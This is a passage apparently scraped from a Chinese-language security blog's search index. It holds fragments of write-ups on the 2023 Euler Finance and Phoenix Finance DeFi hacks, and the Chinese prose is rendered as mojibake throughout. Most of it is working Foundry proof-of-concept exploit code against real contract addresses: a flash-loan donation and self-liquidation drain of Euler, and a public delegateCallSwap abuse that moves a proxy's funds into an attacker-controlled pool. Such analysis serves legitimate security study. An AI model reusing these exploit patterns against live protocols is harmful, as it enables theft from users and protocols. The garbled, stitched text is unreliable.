åªæ˜¯ä¸ºäº†ä½¿ç”¨log_named_decimal_uintäº‹ä»¶ï¼Œå¹¶ä¸çœŸæ­£æ˜¯ä¸€ä¸ªæµ‹è¯• contract Liquidator is Test { function liquidate(address liquidator, address violator) external { // æ¸…ç®—å‰ï¼ŒLiquidatoræ²¡æœ‰eDAI,ä¹Ÿæ²¡æœ‰dDAI console2.log( \"[Liquidator] eDAI balance before liquidate: \", eDAI.balanceOf(liquidator) / 1e18 ); console2.log( \"[Liquidator] dDAI balance after liquidate: \", dDAI.balanceOf(liquidator) / 1e18 ); // è®¡ç®—æ¸…ç®—æœºä¼š IEuler.LiquidationOpportunity memory returnData = Euler .checkLiquidation(liquidator, violator, address(DAI), address(DAI)); console2.log( \"[Liquidator] checkLiquidation, repay: \", returnData.repay / 1e18 ); emit log_named_decimal_uint( \"[Liquidator] checkLiquidation, yield: \", returnData.yield, 18 ); emit log_named_decimal_uint( \"[Liquidator] checkLiquidation, healthScore:: \", returnData.healthScore, 18 ); emit log_named_decimal_uint( \"[Liquidator] checkLiquidation, baseDiscount:\", returnData.baseDiscount, 18 ); emit log_named_decimal_uint( \"[Liquidator] checkLiquidation, discount:\", returnData.discount, 18 ); emit log_named_decimal_uint( \"[Liquidator] checkLiquidation, conversionRate:\", returnData.conversionRate, 18 ); // æ¸…ç®— Euler.liquidate( violator, address(DAI), address(DAI), returnData.repay, 10 * 1e18 ); //æ¸…ç®—åï¼Œ è¿è§„è€…çš„eDAIè¢«è½¬ç§»ç»™æ¸…ç®—è€… emit log_named_decimal_uint( \"[Liquidator] eDAI balance after liquidate: \", eDAI.balanceOf(liquidator), 18 ); // æ¸…ç®—åï¼Œ è¿è§„è€…çš„dDAIï¼ˆè´Ÿå€ºï¼‰ä¹Ÿè¢«è½¬ç§»ç»™æ¸…ç®—è€…ï¼ˆè´Ÿå€ºä¼šæŒ‰ç…§æ‰“æŠ˜ä»·æ ¼è½¬ç§»ç»™æ¸…ç®—è€…ï¼‰ emit log_named_decimal_uint( \"[Liquidator] dDAI balance after liquidate: \", dDAI.balanceOf(liquidator), 18 ); // å¹³è´¦ eDAI.burn(0, dDAI.balanceOf(liquidator)); //ææ¬¾ eDAI.withdraw(0, eDAI.balanceOfUnderlying(liquidator)); emit log_named_decimal_uint( \"[Liquidator] dDAI balance after withdraw: \", dDAI.balanceOf(address(liquidator)), 18 ); emit log_named_decimal_uint( \"[Liquidator] DAI balance after withdraw: \", DAI.balanceOf(liquidator), 18 ); //è½¬è´¦ DAI.transfer(msg.sender, DAI.balanceOf(address(this))); } } contract ViolatorTest is Test { uint256 constant initialFunding = 10000 ether; Violator violator; Liquidator liquidator; function setUp() public { vm.createSelectFork(\"mainnet\", 16_817_995); violator = new Violator(); liquidator = new Liquidator(); deal(address(DAI), address(violator), initialFunding); } function checkHealth(address _who) private { IEuler.LiquidationOpportunity memory returnData = Euler .checkLiquidation(address(0), _who, address(DAI), address(DAI)); emit log_named_decimal_uint(\"healthScore\", returnData.healthScore, 18); } function testViolate() public { violator.DoSometingEvil(); checkHealth(address(address(violator))); liquidator.liquidate(address(liquidator), address(violator)); checkHealth(address(address(violator))); checkHealth(address(liquidator)); emit log_named_decimal_uint( \"total earned:\", DAI.balanceOf(address(this)) - initialFunding, 18 ); } } è¾“å‡ºï¼š [PASS] testViolate() (gas: 829299) Logs: [Violator] eDAI at the end 161161 [Violator] dDAI at the end 190000 [Violator] DAI at the","date":"2023-03-22","objectID":"/euler-finance-attack/:3:0","tags":["defi"],"title":"Euler Finance é»‘å®¢æ”»å‡»åˆ†æ","uri":"/euler-finance-attack/"},{"categories":["security"],"content":"å®Œæ•´çš„POCä»£ç  // SPDX-License-Identifier: SEE LICENSE IN LICENSE pragma solidity ^0.8.10; import \"forge-std/Test.sol\"; //EToken // \u003chttps://docs.euler.finance/developers/getting-started/contract-reference#ieuleretoken\u003e interface EToken { //å°†åº•å±‚ä»£å¸ä»å‘é€è€…è½¬ç§»åˆ° Euler æ± ä¸­ï¼Œå¹¶å¢åŠ è´¦æˆ·çš„ eToken function deposit(uint256 subAccountId, uint256 amount) external; //é“¸é€  eToken å’Œç›¸åº”æ•°é‡çš„ dTokensï¼ˆâ€œè‡ªå€Ÿâ€ï¼‰ function mint(uint256 subAccountId, uint256 amount) external; //é”€æ¯ eToken å’Œç›¸åº”æ•°é‡çš„ dTokens ï¼ˆâ€œè‡ªè¿˜â€ï¼‰ function burn(uint subAccountId, uint amount) external; //å‘å‚¨å¤‡é‡‘æèµ ä»£å¸ function donateToReserves(uint256 subAccountId, uint256 amount) external; //å°†åº•å±‚ä»£å¸ä» Euler æ± ä¸­è½¬ç§»åˆ°å‘é€æ–¹ï¼Œå¹¶å‡å°‘è´¦æˆ·çš„ eTokens function withdraw(uint256 subAccountId, uint256 amount) external; function balanceOf(address account) external view returns (uint); function balanceOfUnderlying(address account) external view returns (uint); function transfer(address to, uint amount) external returns (bool); } //https://docs.euler.finance/developers/getting-started/contract-reference#ieulerdtoken interface DToken { function repay(uint256 subAccountId, uint256 amount) external; function balanceOf(address account) external view returns (uint); } interface IEuler { //æ¸…ç®—æœºä¼š struct LiquidationOpportunity { //æ¸…ç®—é‡‘é¢ uint256 repay; //æ”¶ç›Š uint256 yield; //å¥åº·åˆ†æ•° uint256 healthScore; //åŸºç¡€æŠ˜æ‰£ uint256 baseDiscount; //æŠ˜æ‰£ uint256 discount; //è½¬æ¢ç‡ uint256 conversionRate; } function liquidate( //æ¸…ç®—è€… address violator, //åº•å±‚ä»£å¸(å°†è¦å¿è¿˜çš„ä»£å¸) address underlying, //æŠµæŠ¼ä»£å¸ address collateral, //è¿è§„è€…è¦è½¬ç»™senderçš„åŸºç¡€DTokençš„æ•°é‡ï¼Œå•ä½ä¸ºåŸºç¡€ä»£å¸ã€‚ uint256 repay, //è¿è§„è€…è¦è½¬ç»™senderçš„ETokençš„æœ€ä½å¯æ¥å—æ•°é‡ uint256 minYield ) external; //æ£€æŸ¥æ¸…ç®—æœºä¼š function checkLiquidation( //æ¸…ç®—è€… address liquidator, //è¿è§„è€… address violator, //åº•å±‚ä»£å¸(å°†è¦å¿è¿˜çš„ä»£å¸) address underlying, //æŠµæŠ¼ä»£å¸ address collateral ) external returns (LiquidationOpportunity memory liqOpp); } interface IERC20 { function approve(address spender, uint256 amount) external returns (bool); function balanceOf(address) external view returns (uint256); function decimals() external view returns (uint8); function transfer( address recipient, uint256 amount ) external returns (bool); } // \u003chttps://docs.euler.finance/euler-protocol/addresses#mainnet\u003e IEuler constant Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34); address constant EulerLiquidation = 0x27182842E098f60e3D576794A5bFFb0777E025d3; IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); EToken constant eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC); DToken constant dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686); contract Violator { function DoSometingEvil() external { DAI.approve(address(EulerLiquidation), type(uint256).max); //è´¨æŠ¼ eDAI.deposit(0, 10000 ether); //è´·æ¬¾ eDAI.mint(0, 190000 ether); //æ‰”æ‰ä¸€éƒ¨åˆ†eDAI eDAI.donateToReserves(0, 38000 ether); // æˆåŠŸ (æ²¡æœ‰æ£€æŸ¥è´¦æˆ·çš„æµåŠ¨æ€§) console2.log( \"[Violator] eDAI at the end\", eDAI.balanceOfUnderlying(address(this)) / 1 ether ); console2.log( \"[Violator] dDAI at the end\", dDAI.balanceOf(address(this)) / 1 ether ); console2.log( \"[Violator] DAI at the end\", DAI.balanceOf(address(this)) / 1 ether ); } } contract Liquidator is Test { function liquidate(address liquidator, address violator) external { // æ¸…ç®—å‰ï¼ŒLiquidatoræ²¡æœ‰eDAI,ä¹Ÿæ²¡æœ‰dDAI console2.log( \"[Liquidator] eDAI balance before liquidate: \", eDAI.balanceOf(liquidator) / 1e18 ); console2.log( \"[Liquidator] dDAI balance after liquidate: \", dDAI.balanceOf(liquidator) / 1e18 ); // è®¡ç®—æ¸…ç®—æœºä¼š IEuler.LiquidationOpportunity memory returnData = Euler .checkLiquidation(liquidator, violator, address(DAI), address(DAI)); console2.log( \"[Liquidator] checkLiquidation, repay: \", returnData.repay / 1e18 ); emit log_named_decimal_uint( \"[Liquidator] checkLiquidation, yield: \", returnData.yield, 18 ); emit log_named_decimal_uint( \"[Liquidator] checkLiquidation, healthScore:: \", returnData.healthScore, 18 ); emit log_named_decimal_uint( \"[Liquidator] checkLiquidation, baseDiscount:\", returnData.baseDiscount, 18 ); emit log_named_decimal_uint( \"[Liquidator] checkLiquidation, discount:\", returnData.d","date":"2023-03-22","objectID":"/euler-finance-attack/:4:0","tags":["defi"],"title":"Euler Finance é»‘å®¢æ”»å‡»åˆ†æ","uri":"/euler-finance-attack/"},{"categories":["security"],"content":"é»‘å®¢æ”»å‡»æ¨¡æ‹Ÿä»£ç  txï¼š https://etherscan.io/tx/0xc310a0affe2169d1f6feec1c63dbc7f7c62a887fa48795d327d4d2da2d6b111d ç›¸æ¯”äºæˆ‘ä¸Šé¢çš„POCï¼Œä¸‹é¢çš„æ¨¡æ‹Ÿé»‘å®¢æ”»å‡»çš„ä»£ç æœ‰å‡ ç‚¹ä¸åŒ é»‘å®¢æ²¡æœ‰èŠ±è‡ªå·±çš„é’±å»æŠµæŠ¼ï¼Œè€Œæ˜¯ä½¿ç”¨çš„AaveV2é—ªç”µè´·çš„è´·æ¬¾è¿›è¡Œçš„æ”»å‡» ä¸ºäº†æœ€å¤§åŒ–è·åˆ©ï¼Œåˆ¶é€ æ›´å¤§çš„åè´¦ï¼Œ é»‘å®¢ä¸¤æ¬¡è°ƒç”¨äº†mintå‡½æ•°ï¼Œ åœ¨ç¬¬äºŒæ¬¡è°ƒç”¨mintä¹‹å‰è¿˜äº†ä¸€éƒ¨åˆ†æ¬¾æ˜¯ä¸ºäº†å¢åŠ è‡ªå·±çš„è´¢åŠ¡å¥åº·åº¦ï¼Œä»¥ä¾¿å®Œæˆç¬¬äºŒæ¬¡è´·æ¬¾ é»‘å®¢çš„æ¸…ç®—è€…æ²¡æœ‰å¹³è´¦ï¼ˆæ²¡æœ‰è¿˜é’±ï¼‰ï¼Œä¹Ÿæ²¡å¿…è¦å¹³è´¦ï¼Œå®Œæˆæ¸…ç®—åå…¶eDAIæ•°é‡è¿œè¿œå¤§äºdDAIæ•°é‡ã€‚æ¯”å¦‚ä½ æœ‰100 eDAI, 20çš„dDAI, æœ‰80ç›ˆä½™ï¼Œwithdrawéƒ¨åˆ†ç›ˆä½™è‡ªç„¶ä¸éœ€è¦å¹³è´¦ é»‘å®¢çš„æ¸…ç®—è€…çš„eDAIæ•°é‡å’ŒdDAIæ•°é‡çš„å·®é¢è¿œè¿œå¤§äºå¹³å°ä¸ŠDAIçš„æ€»é‡ï¼Œæ‰€ä»¥withdrawçš„æ—¶å€™æ•°é‡ç”¨çš„æ˜¯å¹³å°çš„å…¨éƒ¨é¢åº¦ eDAI.withdraw(0, DAI.balanceOf(EulerLiquidation)); // SPDX-License-Identifier: SEE LICENSE IN LICENSE pragma solidity ^0.8.10; import \"forge-std/Test.sol\"; // \u003chttps://docs.euler.finance/developers/getting-started/contract-reference#ieuleretoken\u003e interface EToken { //å°†åº•å±‚ä»£å¸ä»å‘é€è€…è½¬ç§»åˆ° Euler æ± ä¸­ï¼Œå¹¶å¢åŠ è´¦æˆ·çš„ eToken function deposit(uint256 subAccountId, uint256 amount) external; //é“¸é€  eToken å’Œç›¸åº”æ•°é‡çš„ dTokensï¼ˆâ€œè‡ªå€Ÿâ€ï¼‰ function mint(uint256 subAccountId, uint256 amount) external; //é”€æ¯ eToken å’Œç›¸åº”æ•°é‡çš„ dTokens ï¼ˆâ€œè‡ªè¿˜â€ï¼‰ function burn(uint subAccountId, uint amount) external; //å‘å‚¨å¤‡é‡‘æèµ ä»£å¸ function donateToReserves(uint256 subAccountId, uint256 amount) external; //å°†åº•å±‚ä»£å¸ä» Euler æ± ä¸­è½¬ç§»åˆ°å‘é€æ–¹ï¼Œå¹¶å‡å°‘è´¦æˆ·çš„ eTokens function withdraw(uint256 subAccountId, uint256 amount) external; function balanceOf(address account) external view returns (uint); function balanceOfUnderlying(address account) external view returns (uint); function transfer(address to, uint amount) external returns (bool); } //https://docs.euler.finance/developers/getting-started/contract-reference#ieulerdtoken interface DToken { function repay(uint256 subAccountId, uint256 amount) external; function balanceOf(address account) external view returns (uint); } interface IEuler { //æ¸…ç®—æœºä¼š struct LiquidationOpportunity { //æ¸…ç®—é‡‘é¢ uint256 repay; //æ”¶ç›Š uint256 yield; //å¥åº·åˆ†æ•° uint256 healthScore; //åŸºç¡€æŠ˜æ‰£ uint256 baseDiscount; //æŠ˜æ‰£ uint256 discount; //è½¬æ¢ç‡ uint256 conversionRate; } function liquidate( //æ¸…ç®—è€… address violator, //åº•å±‚ä»£å¸(å°†è¦å¿è¿˜çš„ä»£å¸) address underlying, //æŠµæŠ¼ä»£å¸ address collateral, //è¿è§„è€…è¦è½¬ç»™senderçš„åŸºç¡€DTokençš„æ•°é‡ï¼Œå•ä½ä¸ºåŸºç¡€ä»£å¸ã€‚ uint256 repay, //è¿è§„è€…è¦è½¬ç»™senderçš„ETokençš„æœ€ä½å¯æ¥å—æ•°é‡ uint256 minYield ) external; //æ£€æŸ¥æ¸…ç®—æœºä¼š function checkLiquidation( //æ¸…ç®—è€… address liquidator, //è¿è§„è€… address violator, //åº•å±‚ä»£å¸(å°†è¦å¿è¿˜çš„ä»£å¸) address underlying, //æŠµæŠ¼ä»£å¸ address collateral ) external returns (LiquidationOpportunity memory liqOpp); } interface IERC20 { function approve(address spender, uint256 amount) external returns (bool); function balanceOf(address) external view returns (uint256); function decimals() external view returns (uint8); function transfer( address recipient, uint256 amount ) external returns (bool); } // \u003chttps://docs.aave.com/developers/core-contracts/pool#flashloan\u003e interface IAaveFlashloan { function flashLoan( address receiver, address[] calldata assets, uint256[] calldata amounts, uint256[] calldata modes, address onBehalfOf, bytes calldata params, uint16 referralCode ) external; } // \u003chttps://docs.euler.finance/euler-protocol/addresses#mainnet\u003e IEuler constant Euler = IEuler(0xf43ce1d09050BAfd6980dD43Cde2aB9F18C85b34); address constant EulerLiquidation = 0x27182842E098f60e3D576794A5bFFb0777E025d3; IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); EToken constant eDAI = EToken(0xe025E3ca2bE02316033184551D4d3Aa22024D9DC); DToken constant dDAI = DToken(0x6085Bc95F506c326DCBCD7A6dd6c79FBc18d4686); IAaveFlashloan constant AaveV2 = IAaveFlashloan( 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9 ); contract Violator { function DoSometingEvil() external { DAI.approve(EulerLiquidation, type(uint256).max); //å°†å€Ÿæ¬¾æ¥çš„3000ä¸‡DAIä¸­çš„2000ä¸‡DAIå­˜å…¥Euleræ± ï¼Œ //å¹¶è·å¾—1950ä¸‡çš„eDAI eDAI.deposit(0, 20_000_000 * 1e18); console2.log( \"[Violator] eDAI balance after deposit DAI: \", eDAI.balanceOf(address(this)) / 1e18 ); //é“¸é€ 2äº¿eDAI (è·å¾—2äº¿dDAIï¼Œå³æ¬ æ¬¾2äº¿) eDAI.mint(0, 200_000_000 * 1e18); console2.log( \"[Violator] eDAI balance after eDAI.mint: \", eDAI.balanceOf(address(this)) / 1e18 ); console2.log( \"[Violator] dDAI balance after eDAI.mint: \", dDAI.balanceOf(address(this)) / 1e18 ); //ä½¿ç”¨DAIå»è¿˜æ¬¾1000ä¸‡ï¼Œæ­¤æ—¶è´·æ¬¾çš„3000ä¸‡DAIè¢«èŠ±å…‰ //è¿˜æ‹¥æœ‰1.9äº¿dDAIï¼Œå³æ¬ æ¬¾1.9äº¿ dDAI.repay(0, 10_000_000 * 1e18); con","date":"2023-03-22","objectID":"/euler-finance-attack/:5:0","tags":["defi"],"title":"Euler Finance é»‘å®¢æ”»å‡»åˆ†æ","uri":"/euler-finance-attack/"},{"categories":["security"],"content":"Phoenix Finance çš„æ™ºèƒ½åˆçº¦è®¿é—®æ§åˆ¶ä¸ä¸¥æ ¼å¯¼è‡´çš„ä¸€æ¬¡æ”»å‡» ","date":"2023-03-15","objectID":"/phoenix-access-control-attack/:0:0","tags":["defi"],"title":"Phoenix è®¿é—®æ§åˆ¶æ”»å‡»åˆ†æ","uri":"/phoenix-access-control-attack/"},{"categories":["security"],"content":"æ¦‚è¿° https://twitter.com/HypernativeLabs/status/1633090456157401088 æ•…äº‹å‘ç”Ÿåœ¨ polygon é“¾ä¸Šçš„ 40067323 é«˜åº¦ tx: 0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4 æ”»å‡»æµç¨‹å‚è€ƒ: https://phalcon.xyz/tx/polygon/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4 ","date":"2023-03-15","objectID":"/phoenix-access-control-attack/:1:0","tags":["defi"],"title":"Phoenix è®¿é—®æ§åˆ¶æ”»å‡»åˆ†æ","uri":"/phoenix-access-control-attack/"},{"categories":["security"],"content":"ä»£ç åˆ†æ Phoenix Finance æœ‰ä¸€ä¸ªä»£ç†åˆçº¦ 0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de å¯¹åº”çš„é€»è¾‘åˆçº¦ä¸º 0x6d68beb09ea7e76d561ea8c4aac34a6611dd9821 é€»è¾‘åˆçº¦ä¸­æœ‰è¿™æ ·ä¸€ä¸ªpublicå‡½æ•°å«åšdelegateCallSwap function delegateCallSwap(bytes memory data) public returns (bytes memory) { (bool success, bytes memory returnData) = phxSwapLib.delegatecall(data); assembly { if eq(success, 0) { revert(add(returnData, 0x20), returndatasize) } } return returnData; } å…¶ä¸­ phxSwapLib å¯ä»¥ä»ä»£ç†åˆçº¦ä¸Šè¯»å‡ºå€¼ä¸º : 0x95620f30263ac0b0B4FFd9B7465838084e89cB84 å®ƒæ˜¯ä¸€ä¸ªUniSwapRouter , åŒ…å«äº†ä¸€ä¸ªswap()å‡½æ•°,ç”¨äºåœ¨æŒ‡å®šçš„routerä¸Šè¿›è¡Œtoken swap function swap(address swapRouter,address token0,address token1,uint256 amountSell) payable external returns (uint256){ return _swap(swapRouter,token0,token1,amountSell); } æ¢³ç†ä¸€ä¸‹ä¾¿å¯ä»¥å¾—åˆ°ä¸‹é¢çš„é€»è¾‘ ä¹Ÿå°±æ˜¯è¯´, ä»»ä½•äººéƒ½å¯ä»¥ä»¥ä»£ç†åˆçº¦(0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de)ä¸ºä¸Šä¸‹æ–‡è¿›è¡Œä»£å¸ç½®æ¢. é‚£ä¹ˆ, å¦‚æœæˆ‘æœ‰å¾ˆå¤šè‡ªå·±çš„åˆ›å»ºçš„ERC20ä»£å¸(MYTOKEN), å¹¶ä»¥è¯¥ERC20ä»£å¸åˆ›å»ºä¸€ä¸ªäº¤æ˜“æ± (Uniwswap Pair) å¹¶ä¸”å¦‚æœåˆšå¥½ä»£ç†åˆçº¦åˆå¾ˆæœ‰é’±, é‚£ä¹ˆæˆ‘å°±å¯ä»¥è®©ä»£ç†åˆçº¦ç”¨çœŸé‡‘ç™½é“¶æ¥ç½®æ¢æˆ‘ä»¬ä¸å€¼é’±çš„MYTOKEN, ä»£ç†åˆçº¦çš„é’±å°±å°†ä¼šè¢«ç½®æ¢åˆ°æˆ‘ä»¬çš„äº¤æ˜“æ± ä¸­, ç„¶åæˆ‘ä»¬å†ç”¨ä¸€å †ä¸å€¼é’±çš„MYTOKENä»äº¤æ˜“æ± ä¸­å°†ä»£ç†åˆçº¦åˆšåˆšç½®æ¢MYTOKENçš„é’±ç½®æ¢å‡ºæ¥. é’±å°±åˆ°æˆ‘ä»¬æ‰‹ä¸­äº†. å¯æƒœçš„æ˜¯ä»£ç†åˆçº¦ç°åœ¨æ²¡é’±(åªæœ‰ 0.000000000423ä¸ªWETH) å¦‚ä½•è®©ä»£ç†åˆçº¦æœ‰é’±? åœ¨é€»è¾‘åˆçº¦ä»£ç ä¸­æœ‰ä¸€ä¸ª buyLeverageå‡½æ•°, ç”¨äºç”¨æˆ·è´­ä¹°Leverage Token , ä¹Ÿå°±æ˜¯æ”»å‡»æµç¨‹ä¸­çœ‹åˆ°çš„WETH_BULL_X3è¿™ä¸ªå¸ buyLeverageå‡½æ•°è°ƒç”¨çš„_buyå‡½æ•°å¦‚ä¸‹ function _buy(leverageInfo memory coinInfo,uint256 amount,uint256 minAmount,uint256 deadLine,bool bFirstToken) ensure(deadLine) notHalted nonReentrant getUnderlyingPrice internal{ address inputToken; if(bFirstToken){ inputToken = coinInfo.token; }else{ inputToken = (coinInfo.id == 0) ? hedgeCoin.token : leverageCoin.token; } amount = getPayableAmount(inputToken,amount); require(amount \u003e 0, 'buy amount is zero'); uint256 userPay = amount; amount = redeemFees(buyFee,inputToken,amount); uint256 price = _tokenNetworthBuy(coinInfo,currentPrice); uint256 leverageAmount = bFirstToken ? amount.mul(calDecimal)/price : amount.mulPrice(currentPrice,coinInfo.id)/price; require(leverageAmount\u003e=minAmount,\"token amount is less than minAmount\"); { uint256 userLoan = (leverageAmount.mul(coinInfo.rebalanceWorth)/calDecimal).mul(coinInfo.leverageRate-feeDecimal)/feeDecimal; userLoan = coinInfo.stakePool.borrow(userLoan); amount = bFirstToken ? userLoan.add(amount) : userLoan; //98% uint256 amountOut = amount.mul(98e16).divPrice(currentPrice,coinInfo.id); address token1 = (coinInfo.id == 0) ? hedgeCoin.token : leverageCoin.token; amount = _swap(coinInfo.token,token1,amount); require(amount\u003e=amountOut, \"swap slip page is more than 2%\"); } coinInfo.leverageToken.mint(msg.sender,leverageAmount); price = price.mul(currentPrice[coinInfo.id])/calDecimal; if(coinInfo.id == 0){ emit BuyLeverage(msg.sender,inputToken,userPay,leverageAmount,price); }else{ emit BuyHedge(msg.sender,inputToken,userPay,leverageAmount,price); } } å…¶ä¸­userLoan = coinInfo.stakePool.borrow(userLoan); è¯¥ä»£ç ä¼šå‘å¦å¤–ä¸€ä¸ªä»£ç†åˆçº¦å€Ÿé’±åˆ°æœ¬ä»£ç†åˆçº¦. æˆ‘æ²¡ææ¸…æ¥šè¿™æ˜¯åœ¨å¹²å˜›. ä½†åæ­£ç”¨æˆ·å‘ä»£ç†åˆçº¦è´­ä¹°Leverage Tokenå, ä»£ç†åˆçº¦ä¼šå¾—åˆ°ä¸¤ç¬”USDC: ç”¨æˆ·ä»˜æ¬¾çš„USDCä»¥åŠè°ƒç”¨coinInfo.stakePool.borrow()å€Ÿæ¥çš„USDC, å¹¶ä¸”å…¶ä¼šå°†è¿™äº›USDCéƒ½è½¬æ¢ä¸ºWETH æ‰€ä»¥, ä¸ºäº†è®©ä»£ç†åˆçº¦æœ‰é’±ç½®æ¢æˆ‘ä»¬çš„å¸, æˆ‘ä»¬èŠ±Xå‘ä»£ç†åˆçº¦è´­ä¹°Leverage Token, ä»£ç†åˆçº¦ä¼šæ”¶åˆ°çš„ä»·å€¼ä¸º X + Y , Yæ˜¯å®ƒå‘å¦å¤–ä¸€ä¸ªä»£ç†åˆçº¦å€Ÿæ¥çš„ ç„¶åæˆ‘ä»¬è®©ä»£ç†åˆçº¦èŠ± X + Y å…¨éƒ¨æ‹¿æ¥ç½®æ¢æˆ‘ä»¬çš„å¸, è¿™æ ·é™¤å»æˆæœ¬X, æˆ‘ä»¬èƒ½å‡€èµšY åœ¨æœ¬æ¬¡æ”»å‡»ä¸­, é»‘å®¢ä¹Ÿæ²¡æƒ³èŠ±è‡ªå·±çš„é’±, æ‰€ä»¥ä»–ä½¿ç”¨äº†é—ªç”µè´·æ¥æ”¯ä»˜è´­ä¹°Leverage Tokençš„æˆæœ¬X ","date":"2023-03-15","objectID":"/phoenix-access-control-attack/:2:0","tags":["defi"],"title":"Phoenix è®¿é—®æ§åˆ¶æ”»å‡»åˆ†æ","uri":"/phoenix-access-control-attack/"},{"categories":["security"],"content":"æ”»å‡»æµç¨‹ åˆ°è¿™é‡ŒæŸ¥çœ‹æ”»å‡»æµç¨‹ : https://phalcon.xyz/tx/polygon/0x6fa6374d43df083679cdab97149af8207cda2471620a06d3f28b115136b8e2c4 æˆ‘æ€»ç»“äº†ä¸€ä¸‹, å¦‚ä¸‹å›¾, æ¯ä¸€è¡Œå¼€å¤´çš„æ•°å­—å¯¹åº”æ”»å‡»æµç¨‹å›¾ä¸­çš„è¡Œå· ","date":"2023-03-15","objectID":"/phoenix-access-control-attack/:3:0","tags":["defi"],"title":"Phoenix è®¿é—®æ§åˆ¶æ”»å‡»åˆ†æ","uri":"/phoenix-access-control-attack/"},{"categories":["security"],"content":"POC // SPDX-License-Identifier: SEE LICENSE IN LICENSE pragma solidity ^0.8.10; import \"forge-std/Test.sol\"; import \"lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\"; import \"lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\"; import \"lib/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol\"; interface phxProxy { function buyLeverage( uint256 amount, uint256 minAmount, uint256 deadLine, bytes calldata ) external; function delegateCallSwap(bytes memory data) external; } interface DPPAdvanced { function flashLoan( uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata ) external; } //https://polygonscan.com/address/0x65baf1dc6fa0c7e459a36e2e310836b396d1b1de#code phxProxy constant PHX_PROXY = phxProxy( 0x65BaF1DC6fA0C7E459A36E2E310836B396D1B1de ); IUniswapV2Router02 constant QuickSwapRouter = IUniswapV2Router02( 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff ); DPPAdvanced constant DPP = DPPAdvanced( 0x1093ceD81987Bf532c2b7907B2A8525cd0C17295 ); IERC20 constant USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174); IERC20 constant WETH = IERC20(0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619); // æˆ‘ä»¬è‡ªå·±çš„åƒåœ¾å¸ contract ExampleToken is ERC20 { constructor() ERC20(\"Example\", \"EXM\") { _mint(msg.sender, 1_500_000 * 1e18); } } contract HackTest is Test { ExampleToken myToken; function setUp() public { vm.createSelectFork(\"polygon\", 40066946); myToken = new ExampleToken(); deal(address(WETH), address(this), 1 ether); vm.label(address(PHX_PROXY), \"PHX_PROXY\"); vm.label(address(QuickSwapRouter), \"QuickSwapRouter\"); vm.label(address(DPP), \"DPP\"); vm.label(address(USDC), \"USDC\"); vm.label(address(WETH), \"WETH\"); vm.label( 0x6d68bEB09ea7e76d561EA8C4Aac34A6611dd9821, \"LogicContractOfProxy\" ); vm.label(0x0a6293a64D4C2EaaB8e349FA6A9F4D238d46b491, \"polygonOracle\"); vm.label( 0xd0289082cf4c5c2ba448B4B9c67232729aa75EfA, \"coinInfo.stakePool\" ); vm.label( 0x1021024d6Dc53BCb929eA0e6A664194809C9464a, \"Logic of coinInfo.stakePool\" ); } function testHack() public { emit log_named_decimal_uint( \"Attacker USDC balance before exploit:\", USDC.balanceOf(address(this)), 6 ); emit log_named_decimal_uint( \"Attacker WETH balance before exploit:\", WETH.balanceOf(address(this)), 18 ); // 1. æ„å»ºåƒåœ¾å¸äº¤æ˜“æ± ï¼Œ æ–¹ä¾¿ä»£ç†åˆçº¦è¿‡æ¥ç½®æ¢~~ myToken.approve(address(QuickSwapRouter), type(uint256).max); WETH.approve(address(QuickSwapRouter), type(uint256).max); QuickSwapRouter.addLiquidity( address(myToken), address(WETH), 7 * 1e15, 7 * 1e15, 0, 0, address(this), block.timestamp ); // 2. ä½¿ç”¨é—ªç”µè´·ï¼Œè´·æ¬¾ä»¥å‘ä»£ç†åˆçº¦è´­ä¹°Leverage Token // https://dodoex.github.io/docs/docs/flashSwap DPP.flashLoan(0, 7990000000, address(this), new bytes(1)); } function DPPFlashLoanCall( address, uint256, uint256, bytes calldata ) external { emit log_named_decimal_uint( \"WETH.balanceOf(address(PHX_PROXY)) before buyLeverage: \", WETH.balanceOf(address(PHX_PROXY)), 18 ); // 3, å‘ä»£ç†åˆçº¦è´­ä¹°Leverage Token, make the proxy contract rich~ USDC.approve(address(PHX_PROXY), type(uint256).max); PHX_PROXY.buyLeverage(7990000000, 0, block.timestamp, new bytes(0)); uint256 swapAmount = WETH.balanceOf(address(PHX_PROXY)); emit log_named_decimal_uint( \"WETH.balanceOf(address(PHX_PROXY)) after buyLeverage: \", WETH.balanceOf(address(PHX_PROXY)), 18 ); //4. è®©ä»£ç†åˆçº¦ç”¨å®ƒçš„WETHæ¥ç½®æ¢æˆ‘ä»¬çš„åƒåœ¾å¸ // ç„¶åä»£ç†åˆçº¦çš„WETHè½¬ç§»åˆ°æˆ‘ä»¬åƒåœ¾å¸äº¤æ˜“æ± ä¸­ bytes memory swapData = abi.encodeWithSelector( 0xa9678a18, //swap address(QuickSwapRouter), address(WETH), address(myToken), swapAmount ); PHX_PROXY.delegateCallSwap(swapData); emit log_named_decimal_uint( \"WETH.balanceOf(address(PHX_PROXY)) after exploit: \", WETH.balanceOf(address(PHX_PROXY)), 18 ); // 5. è¿™é‡Œå†™æˆ2æ­¥æ›´å®¹æ˜“ç†è§£ // 5.1 æˆ‘ä»¬ç”¨å¦å¤–ä¸€å †åƒåœ¾å¸å‘æˆ‘ä»¬åˆ›å»ºçš„äº¤æ˜“æ± ï¼ˆmytoken \u003c=\u003e WETHï¼‰è¿›è¡Œç½®æ¢ï¼Œå°†å®ƒæ”¶åˆ°çš„ä»£ç†åˆçº¦ç»™çš„WETHç½®æ¢å‡ºæ¥ // 5.2 ç„¶åæˆ‘ä»¬å°†å¾—åˆ°çš„WETHåˆåˆ°å…¶ä»–çš„äº¤æ˜“æ± 